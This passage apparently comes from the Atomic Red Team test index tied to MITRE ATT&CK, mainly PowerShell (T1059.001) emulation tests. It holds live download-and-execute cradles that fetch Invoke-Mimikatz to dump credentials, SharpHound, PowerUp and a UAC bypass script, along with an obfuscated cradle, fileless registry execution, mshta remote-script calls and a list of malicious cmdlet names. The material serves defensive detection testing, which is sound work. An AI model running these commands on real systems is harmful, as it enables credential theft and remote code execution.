      - source_name: inv_ps_attacks
        description: Hastings, M. (2014, July 16). Investigating PowerShell Attacks.
          Retrieved December 1, 2021.
        url: https://powershellmagazine.com/2014/07/16/investigating-powershell-attacks/
      - source_name: Malware Archaeology PowerShell Cheat Sheet
        description: Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING
          CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.
        url: http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf
      - source_name: TechNet PowerShell
        description: Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April
          28, 2016.
        url: https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx
      - source_name: Sixdub PowerPick Jan 2016
        description: Warner, J.. (2015, January 6). Inexorable PowerShell – A Red
          Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December
          8, 2018.
        url: https://web.archive.org/web/20160327101330/http://www.sixdub.net/?p=367
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1059.001
    atomic_tests:
    - name: Mimikatz
      auto_generated_guid: f3132740-55bc-48c4-bcc0-758a459cd027
      description: 'Download Mimikatz and dump credentials. Upon execution, mimikatz
        dump details and password hashes will be displayed.

        '
      supported_platforms:
      - windows
      input_arguments:
        mimurl:
          description: Mimikatz url
          type: url
          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
      executor:
        command: 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''#{mimurl}'');
          Invoke-Mimikatz -DumpCreds"

          '
        name: command_prompt
        elevation_required: true
    - name: Run BloodHound from local disk
      auto_generated_guid: a21bb23e-e677-4ee7-af90-6931b57b6350
      description: |
        Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.

        Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
      supported_platforms:
      - windows
      input_arguments:
        file_path:
          description: File path for SharpHound payload
          type: string
          default: PathToAtomicsFolder\T1059.001\src
      dependency_executor_name: powershell
      dependencies:
      - description: 'SharpHound.ps1 must be located at #{file_path}

          '
        prereq_command: 'if (Test-Path #{file_path}\SharpHound.ps1) {exit 0} else
          {exit 1}

          '
        get_prereq_command: 'Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1"
          -OutFile "#{file_path}\SharpHound.ps1"

          '
      executor:
        command: |
          write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
          import-module #{file_path}\SharpHound.ps1
          Invoke-BloodHound -OutputDirectory $env:Temp
          Start-Sleep 5
        cleanup_command: 'Remove-Item $env:Temp\*BloodHound.zip -Force

          '
        name: powershell
    - name: Run Bloodhound from Memory using Download Cradle
      auto_generated_guid: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
      description: |
        Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.

        Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
      supported_platforms:
      - windows
      executor:
        command: |
          write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
          IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
          Invoke-BloodHound -OutputDirectory $env:Temp
          Start-Sleep 5
        cleanup_command: 'Remove-Item $env:Temp\*BloodHound.zip -Force

          '
        name: powershell
    - name: Obfuscation Tests
      auto_generated_guid: 4297c41a-8168-4138-972d-01f3ee92c804
      description: 'Different obfuscated methods to test. Upon execution, reaches
        out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM
        REMOTE LOCATION"

        '
      supported_platforms:
      - windows
      executor:
        command: |
          (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
          (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
          Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
        name: powershell
    - name: Mimikatz - Cradlecraft PsSendKeys
      auto_generated_guid: af1800cf-9f9d-4fd1-a709-14b1e6de020d
      description: 'Run mimikatz via PsSendKeys. Upon execution, automated actions
        will take place to open file explorer, open notepad and input code, then mimikatz
        dump info will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object
          -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty
          $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP
          $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item
          Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep
          -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds
          500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable
          _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item
          Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable
          _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item
          Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP
          $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz
          -dumpcr\n"
        name: powershell
        elevation_required: true
    - name: Invoke-AppPathBypass
      auto_generated_guid: 06a220b6-7e29-4bd8-9d07-5b4d86742372
      description: |
        Note: Windows 10 only. Upon execution windows backup and restore window will be opened.

        Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
      supported_platforms:
      - windows
      executor:
        command: 'Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'');
          Invoke-AppPathBypass -Payload ''C:\Windows\System32\cmd.exe''"

          '
        name: command_prompt
    - name: Powershell MsXml COM object - with prompt
      auto_generated_guid: 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da
      description: |
        Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.

        Provided by https://github.com/mgreen27/mgreen27.github.io
      supported_platforms:
      - windows
      input_arguments:
        url:
          description: url of payload to execute
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
      executor:
        command: 'powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject
          MsXml2.ServerXmlHttp;$comMsXml.Open(''GET'',''#{url}'',$False);$comMsXml.Send();IEX
          $comMsXml.ResponseText"

          '
        name: command_prompt
    - name: Powershell XML requests
      auto_generated_guid: 4396927f-e503-427b-b023-31049b9b09a6
      description: |
        Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.

        Provided by https://github.com/mgreen27/mgreen27.github.io
      supported_platforms:
      - windows
      input_arguments:
        url:
          description: url of payload to execute
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
      executor:
        command: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec
          bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(''#{url}'');$Xml.command.a.execute
          | IEX"

          '
        name: command_prompt
    - name: Powershell invoke mshta.exe download
      auto_generated_guid: 8a2ad40b-12c7-4b25-8521-2737b0a415af
      description: |
        Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".

        Provided by https://github.com/mgreen27/mgreen27.github.io
      supported_platforms:
      - windows
      input_arguments:
        url:
          description: url of payload to execute
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
      executor:
        command: 'C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject(''script:#{url}'').Exec();close()"

          '
        name: command_prompt
    - name: Powershell Invoke-DownloadCradle
      auto_generated_guid: cc50fa2a-a4be-42af-a88f-e347ba0bf4d7
      description: |
        Provided by https://github.com/mgreen27/mgreen27.github.io
        Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.
      supported_platforms:
      - windows
      executor:
        steps: |
          1. Open Powershell_ise as a Privileged Account
          2. Invoke-DownloadCradle.ps1
        name: manual
    - name: PowerShell Fileless Script Execution
      auto_generated_guid: fa050f5e-bc75-4230-af73-b6fd7852cd73
      description: |
        Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open "C:\Windows\Temp" and verify that
        art-marker.txt is in the folder.
      supported_platforms:
      - windows
      executor:
        command: |
          # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
          reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
          iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
        cleanup_command: |
          Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
          Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
        name: powershell
    - name: PowerShell Downgrade Attack
      auto_generated_guid: 9148e7c4-9356-420e-a416-e896e9c0f73e
      description: |
        This test requires the manual installation of PowerShell V2.

        Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
      supported_platforms:
      - windows
      dependencies:
      - description: 'PowerShell version 2 must be installed

          '
        prereq_command: 'if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit
          0} else {exit 1}

          '
        get_prereq_command: 'Write-Host  Automated installer not implemented yet,
          please install PowerShell v2 manually

          '
      executor:
        command: 'powershell.exe -version 2 -Command Write-Host $PSVersion

          '
        name: powershell
    - name: NTFS Alternate Data Stream Access
      auto_generated_guid: 8e5c5532-1181-4c1d-bb79-b3a9f5dbd680
      description: 'Creates a file with an alternate data stream and simulates executing
        that hidden code/file. Upon execution, "Stream Data Executed" will be displayed.

        '
      supported_platforms:
      - windows
      input_arguments:
        ads_file:
          description: File created to store Alternate Stream Data
          type: string
          default: "$env:TEMP\\NTFS_ADS.txt"
      dependencies:
      - description: 'Homedrive must be an NTFS drive

          '
        prereq_command: 'if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
          -contains "NTFS") {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Prereq''s for this test cannot be met automatically

          '
      executor:
        name: powershell
        command: |
          Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
          $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
          Invoke-Expression $streamcommand
        cleanup_command: 'Remove-Item #{ads_file} -Force -ErrorAction Ignore

          '
    - name: PowerShell Session Creation and Use
      auto_generated_guid: 7c1acec2-78fa-4305-a3e0-db2a54cddecd
      description: |
        Connect to a remote powershell session and interact with the host.
        Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.
      supported_platforms:
      - windows
      input_arguments:
        hostname_to_connect:
          description: The host to connect to, by default it will connect to the local
            machine
          type: string
          default: "$env:COMPUTERNAME"
      dependencies:
      - description: 'PSRemoting must be enabled

          '
        prereq_command: "Try {\n    New-PSSession -ComputerName #{hostname_to_connect}
          -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n"
        get_prereq_command: 'Enable-PSRemoting

          '
      executor:
        name: powershell
        elevation_required: true
        command: |
          New-PSSession -ComputerName #{hostname_to_connect}
          Test-Connection $env:COMPUTERNAME
          Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
          Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
          Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
    - name: ATHPowerShellCommandLineParameter -Command parameter variations
      auto_generated_guid: 686a9785-f99b-41d4-90df-66ed515f81d7
      description: Executes powershell.exe with variations of the -Command parameter
      supported_platforms:
      - windows
      input_arguments:
        command_line_switch_type:
          description: The type of supported command-line switch to use
          type: string
          default: Hyphen
        command_param_variation:
          description: The "Command" parameter variation to use
          type: string
          default: C
      dependencies:
      - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
          must be exported in the module.
        prereq_command: |-
          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
          if (-not $RequiredModule) {exit 1}
          if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
          -Force

          '
      executor:
        command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
          -CommandParamVariation #{command_param_variation} -Execute -ErrorAction
          Stop'
        name: powershell
    - name: ATHPowerShellCommandLineParameter -Command parameter variations with encoded
        arguments
      auto_generated_guid: 1c0a870f-dc74-49cf-9afc-eccc45e58790
      description: Executes powershell.exe with variations of the -Command parameter
        with encoded arguments supplied
      supported_platforms:
      - windows
      input_arguments:
        command_line_switch_type:
          description: The type of supported command-line switch to use
          type: string
          default: Hyphen
        command_param_variation:
          description: The "Command" parameter variation to use
          type: string
          default: C
        encoded_arguments_param_variation:
          description: The "EncodedArguments" parameter variation to use
          type: string
          default: EA
      dependencies:
      - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
          must be exported in the module.
        prereq_command: |-
          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
          if (-not $RequiredModule) {exit 1}
          if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
          -Force

          '
      executor:
        command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
          -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation
          #{encoded_arguments_param_variation} -Execute -ErrorAction Stop'
        name: powershell
    - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
      auto_generated_guid: 86a43bad-12e3-4e85-b97c-4d5cf25b95c3
      description: Executes powershell.exe with variations of the -EncodedCommand
        parameter
      supported_platforms:
      - windows
      input_arguments:
        command_line_switch_type:
          description: The type of supported command-line switch to use
          type: string
          default: Hyphen
        encoded_command_param_variation:
          description: The "EncodedCommand" parameter variation to use
          type: string
          default: E
      dependencies:
      - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
          must be exported in the module.
        prereq_command: |-
          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
          if (-not $RequiredModule) {exit 1}
          if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
          -Force

          '
      executor:
        command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
          -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute
          -ErrorAction Stop'
        name: powershell
    - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
        with encoded arguments
      auto_generated_guid: 0d181431-ddf3-4826-8055-2dbf63ae848b
      description: Executes powershell.exe with variations of the -EncodedCommand
        parameter with encoded arguments supplied
      supported_platforms:
      - windows
      input_arguments:
        encoded_command_param_variation:
          description: The "EncodedCommand" parameter variation to use
          type: string
          default: E
        command_line_switch_type:
          description: The type of supported command-line switch to use
          type: string
          default: Hyphen
        encoded_arguments_param_variation:
          description: The "EncodedArguments" parameter variation to use
          type: string
          default: EncodedArguments
      dependencies:
      - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
          must be exported in the module.
        prereq_command: |-
          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
          if (-not $RequiredModule) {exit 1}
          if (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}
        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
          -Force

          '
      executor:
        command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
          -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments
          -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute
          -ErrorAction Stop'
        name: powershell
    - name: PowerShell Command Execution
      auto_generated_guid: a538de64-1c74-46ed-aa60-b995ed302598
      description: 'Use of obfuscated PowerShell to execute an arbitrary command;
        outputs "Hello, from PowerShell!". Example is from the 2021 Threat Detection
        Report by Red Canary.

        '
      supported_platforms:
      - windows
      input_arguments:
        obfuscated_code:
          description: 'Defaults to: Invoke-Expression with a "Write-Host" line.'
          type: string
          default: JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
      executor:
        command: 'powershell.exe -e  #{obfuscated_code}

          '
        name: command_prompt
    - name: PowerShell Invoke Known Malicious Cmdlets
      auto_generated_guid: 49eb9404-5e0f-4031-a179-b40f7be385e3
      description: Powershell execution of known Malicious PowerShell Cmdlets
      supported_platforms:
      - windows
      input_arguments:
        Malicious_cmdlets:
          description: Known Malicious Cmdlets
          type: string
          default: '"Add-Persistence", "Find-AVSignature", "Get-GPPAutologon", "Get-GPPPassword",
            "Get-HttpStatus", "Get-Keystrokes", "Get-SecurityPackages", "Get-TimedScreenshot",
            "Get-VaultCredential", "Get-VolumeShadowCopy", "Install-SSP", "Invoke-CredentialInjection",
            "Invoke-DllInjection", "Invoke-Mimikatz", "Invoke-NinjaCopy", "Invoke-Portscan",
            "Invoke-ReflectivePEInjection", "Invoke-ReverseDnsLookup", "Invoke-Shellcode",
            "Invoke-TokenManipulation", "Invoke-WmiCommand", "Mount-VolumeShadowCopy",
            "New-ElevatedPersistenceOption", "New-UserPersistenceOption", "New-VolumeShadowCopy",
            "Out-CompressedDll", "Out-EncodedCommand", "Out-EncryptedScript", "Out-Minidump",
            "PowerUp", "PowerView", "Remove-Comments", "Remove-VolumeShadowCopy",
            "Set-CriticalProcess", "Set-MasterBootRecord"

            '
      executor:
        name: powershell
        elevation_required: true
        command: |
          $malcmdlets = #{Malicious_cmdlets}
          foreach ($cmdlets in $malcmdlets) {
              "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
          foreach ($cmdlets in $malcmdlets) {
              $cmdlets}
    - name: PowerUp Invoke-AllChecks
      auto_generated_guid: 1289f78d-22d2-4590-ac76-166737e1811b
      description: 'Check for privilege escalation paths using PowerUp from PowerShellMafia

        '
      supported_platforms:
      - windows
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
          Invoke-AllChecks
        name: powershell
    - name: Abuse Nslookup with DNS Records
      auto_generated_guid: 999bff6d-dc15-44c9-9f5c-e1051bfc86e1
      description: |
        Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.
        [reference](https://twitter.com/jstrosch/status/1237382986557001729)
      supported_platforms:
      - windows
      executor:
        command: |
          # creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
          # this would not be part of a real attack but helpful for this simulation
          function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
          powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
        name: powershell
  T1170:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ricardo Dias
      - Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1170
        url: https://attack.mitre.org/techniques/T1170
      - source_name: Wikipedia HTML Application
        description: Wikipedia. (2017, October 14). HTML Application. Retrieved October
          27, 2017.
        url: https://en.wikipedia.org/wiki/HTML_Application
      - source_name: MSDN HTML Applications
        description: Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.
        url: https://msdn.microsoft.com/library/ms536471.aspx
      - url: https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf
        description: Gross, J. (2016, February 23). Operation Dust Storm. Retrieved
          December 22, 2021.
        source_name: Cylance Dust Storm
      - source_name: Red Canary HTA Abuse Part Deux
        description: McCammon, K. (2015, August 14). Microsoft HTML Application (HTA)
          Abuse, Part Deux. Retrieved October 27, 2017.
        url: https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/
      - url: https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html
        description: 'Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R.
          (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler.
          Retrieved October 27, 2017.'
        source_name: FireEye Attacks Leveraging HTA
      - description: Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis
          Of Kovter Persistence. Retrieved December 5, 2017.
        source_name: Airbus Security Kovter Analysis
        url: https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/
      - url: https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html
        description: Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing
          LNK. Retrieved April 24, 2017.
        source_name: FireEye FIN7 April 2017
      - source_name: LOLBAS Mshta
        url: https://lolbas-project.github.io/lolbas/Binaries/Mshta/
        description: LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.
      modified: '2022-01-19T21:19:03.910Z'
      name: Mshta
      description: "Mshta.exe is a utility that executes Microsoft HTML Applications
        (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia
        HTML Application) HTAs are standalone applications that execute using the
        same models and technologies of Internet Explorer, but outside of the browser.
        (Citation: MSDN HTML Applications)\n\nAdversaries can use mshta.exe to proxy
        execution of malicious .hta files and Javascript or VBScript through a trusted
        Windows utility. There are several examples of different types of threats
        leveraging mshta.exe during initial compromise and for execution of code (Citation:
        Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation:
        FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis)
        (Citation: FireEye FIN7 April 2017) \n\nFiles may be executed by mshta.exe
        through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey
        may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe
        can be used to bypass application whitelisting solutions that do not account
        for its potential use. Since mshta.exe executes outside of the Internet Explorer's
        security context, it also bypasses browser security settings. (Citation: LOLBAS
        Mshta)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

        Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Application whitelisting
      - Digital Certificate Validation
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1053.006:
    technique:
      x_mitre_platforms:
      - Linux
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - SarathKumar Rajendran, Trimble Inc
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21
      type: attack-pattern
      created: '2020-10-12T17:50:31.584Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1053.006
        url: https://attack.mitre.org/techniques/T1053/006
      - source_name: archlinux Systemd Timers Aug 2020
        url: https://wiki.archlinux.org/index.php/Systemd/Timers
        description: archlinux. (2020, August 11). systemd/Timers. Retrieved October
          12, 2020.
      - source_name: Systemd Remote Control
        url: https://www.tecmint.com/control-systemd-services-on-remote-linux-server/
        description: Aaron Kili. (2018, January 16). How to Control Systemd Services
          on Remote Linux Server. Retrieved July 26, 2021.
      - source_name: 'Linux man-pages: systemd January 2014'
        url: http://man7.org/linux/man-pages/man1/systemd.1.html
        description: Linux man-pages. (2014, January). systemd(1) - Linux manual page.
          Retrieved April 23, 2019.
      - description: Catalin Cimpanu. (2018, July 10). Malware Found in Arch Linux
          AUR Package Repository. Retrieved April 23, 2019.
        url: https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/
        source_name: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018
      - description: Catalin Cimpanu. (2018, July 10). ~x file downloaded in public
          Arch package compromise. Retrieved April 23, 2019.
        url: https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a
        source_name: gist Arch package compromise 10JUL2018
      - description: Eli Schwartz. (2018, June 8). acroread package compromised. Retrieved
          April 23, 2019.
        url: https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html
        source_name: acroread package compromised Arch Linux Mail 8JUL2018
      modified: '2021-07-27T16:43:25.027Z'
      name: 'Scheduled Task/Job: Systemd Timers'
      description: |-
        Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)

